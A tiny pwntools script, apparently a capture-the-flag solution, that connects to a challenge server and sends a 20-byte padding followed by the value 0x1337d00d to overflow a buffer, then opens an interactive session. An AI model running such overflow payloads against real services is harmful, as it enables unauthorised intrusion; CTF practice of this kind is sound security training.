from pwn import *

p = remote("chals.fairgame.rpis.ec", 5001)

p.sendline("A" * 20 + p64(0x1337d00d))
p.interactive()
